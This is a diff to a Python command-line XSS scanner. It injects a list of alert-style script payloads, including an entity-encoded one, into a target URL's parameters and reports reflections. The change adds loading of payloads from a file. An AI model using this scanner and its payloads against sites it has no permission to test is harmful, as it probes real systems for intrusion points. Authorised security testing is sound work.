@@ -6,7 +6,6 @@ from bs4 import BeautifulSoup
 import argparse
 from termcolor import colored
 
-
 os.system("clear")
 os.system("figlet DegreatArizona XSS")
 print()
@@ -21,7 +20,7 @@ print(colored("Degreatarizona is not responsible for misusing it.", 'yellow'))
 print()
 
 # Common XSS payloads
-payloads = [
+default_payloads = [
     "<script>alert('XSS')</script>",
     "'\"><script>alert('XSS')</script>",
     "\"><script>alert('XSS')</script>",
@@ -46,7 +45,15 @@ payloads = [
     "<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(1)</script>"
 ]
 
-def scan_xss(url, params, cookies=None):
+def load_payloads_from_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            return [line.strip() for line in file if line.strip()]
+    except Exception as e:
+        print(colored(f"Error reading payload file: {e}", 'red'))
+        return []
+
+def scan_xss(url, params, payloads, cookies=None):
     for param in params:
         for payload in payloads:
             # Create a copy of the parameters and inject the payload
@@ -56,7 +63,7 @@ def scan_xss(url, params, cookies=None):
                 response = requests.get(url, params=test_params, cookies=cookies)
                 print(colored(f"Testing {param} with payload: {payload}", 'green'))
                 print(colored(f"URL: {response.url}", 'green'))
-                
+
                 if payload in response.text:
                     print(colored(f"[!] Potential XSS vulnerability found with payload: {payload}", 'red'))
                     print(colored(f"Parameter: {param}", 'red'))
@@ -73,9 +80,10 @@ if __name__ == "__main__":
     parser.add_argument("url", help="Target URL")
     parser.add_argument("params", nargs="+", help="Parameters to test (e.g., 'param1 param2')")
     parser.add_argument("--cookies", help="Cookies to include in the request (key=value;key2=value2)")
+    parser.add_argument("--payload-file", help="File containing XSS payloads")
 
     args = parser.parse_args()
-    
+
     target_url = args.url
     parameters = {param: "" for param in args.params}
 
@@ -83,5 +91,9 @@ if __name__ == "__main__":
     if args.cookies:
         cookies = dict(item.split("=") for item in args.cookies.split(";"))
 
+    payloads = default_payloads
+    if args.payload_file:
+        payloads = load_payloads_from_file(args.payload_file)
+
     # Perform the scan
-    scan_xss(target_url, parameters, cookies)
+    scan_xss(target_url, parameters, payloads, cookies)
